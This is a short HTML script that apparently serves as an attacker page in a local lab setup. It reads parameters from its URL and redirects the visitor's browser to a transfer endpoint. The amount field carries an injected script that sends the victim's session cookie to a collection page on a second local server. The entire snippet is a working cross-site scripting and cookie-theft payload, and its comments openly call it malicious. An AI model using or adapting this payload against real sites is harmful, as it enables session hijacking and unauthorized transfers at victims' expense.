    <script>
        // Extract parameters from the URL
        const params = new URLSearchParams(window.location.search);
        const recipient = params.get('recipient');
        const amount = params.get('amount');

        // Construct the malicious URL with XSS payload
        const victimURL = `http://localhost:8000/transfer?recipient=${recipient}&amount=<script>document.location='http://localhost:9000/steal.html?cookie='+document.cookie</script>`;

        // Redirect the browser to the malicious URL
        document.location = victimURL;
    </script>
